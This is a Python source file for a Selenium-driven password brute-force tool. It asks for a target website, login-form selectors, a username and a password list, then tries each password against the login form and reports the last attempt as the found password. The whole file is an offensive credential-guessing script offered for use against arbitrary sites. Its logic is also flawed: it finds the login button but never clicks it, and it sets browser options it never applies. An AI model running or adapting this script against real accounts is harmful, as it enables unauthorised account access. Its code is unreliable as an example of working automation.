import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import NoSuchElementException


# Graphics
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE = '\33[37m'


# Config#
parser = OptionParser()
now = datetime.datetime.now()


# Args
parser.add_option("-u", "--username", dest="username", help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel", help="Choose the username selector")
parser.add_option("--passsel", dest="passsel", help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel", help="Choose the login button selector")
parser.add_option("--passlist", dest="passlist", help="Enter the password list directory")
parser.add_option("--website", dest="website", help="choose a website")
(options, args) = parser.parse_args()

BROWSER_DVR_DIR = 'C:\\webdrivers\\BROWSERdriver.exe'


def wizard():
    print(banner)
    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    sys.stdout.write(color.GREEN + '[!] ' + color.CWHITE + 'Checking if site exists ')
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print(color.GREEN + '[OK]'+color.CWHITE)
            sys.stdout.flush()
    except NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print(color.RED + '[!]'+color.CWHITE + 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print(color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print(color.RED + '[!]'+color.CWHITE + ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(
        color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    password_selector = input(
        color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = input(
        color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username = input(
        color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    pass_list = input(
        color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    brutes(username, username_selector, password_selector,
           login_btn_selector, pass_list, website)


def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
    f = open(pass_list, 'r')
    driver = Service(BROWSER_DVR_DIR)
    optionss = webdriver.EdgeOptions()
    optionss.add_experimental_option('excludeSwitches', ['enable-logging'])
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1  # count
    browser = webdriver.Edge(service = driver) #type: ignore
    temp = ""
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element(By.NAME, username_selector)
                Sel_pas = browser.find_element(By.NAME, password_selector)
                enter = browser.find_element(By.NAME, login_btn_selector)
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                t.sleep(5)
                print('-'*30)
                print(color.GREEN + 'Tried password: '+ color.RED + line + color.GREEN + 'for user: '+color.RED + username)
                print('-'*30)
                temp = line
        except KeyboardInterrupt:
            exit()
        except NoSuchElementException:
            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print('LAST PASS ATTEMPT BELLOW')
            print(color.GREEN + 'Password has been found: {0}'.format(temp))
            print(color.YELLOW + 'Have fun :)')
            exit()

banner = color.BOLD + color.RED + '''
 ######                           #######                                         
 #     #    ##     ####    ####   #        #    #  ######  ######  ######  #####  
 #     #   #  #   #       #       #        #    #      #       #   #       #    # 
 ######   #    #   ####    ####   #####    #    #     #       #    #####   #    # 
 #        ######       #       #  #        #    #    #       #     #       #####  
 #        #    #  #    #  #    #  #        #    #   #       #      #       #   #  
 #        #    #   ####    ####   #         ####   ######  ######  ######  #    # 

{2} Password Brute-force tool
{2} Version 1.0
{1} Author: Sparky99
{1} Based on: Hatch [By: MetaChar]
'''.format(color.RED, color.CWHITE, color.GREEN,)

driver = Service(BROWSER_DVR_DIR)
browser = webdriver.Edge(service = driver) #type: ignore
optionss = webdriver.EdgeOptions()
optionss.add_experimental_option('excludeSwitches', ['enable-logging'])
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
count = 1  # count

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print(banner)
brutes(username, username_selector, password_selector,login_btn_selector, pass_list, website)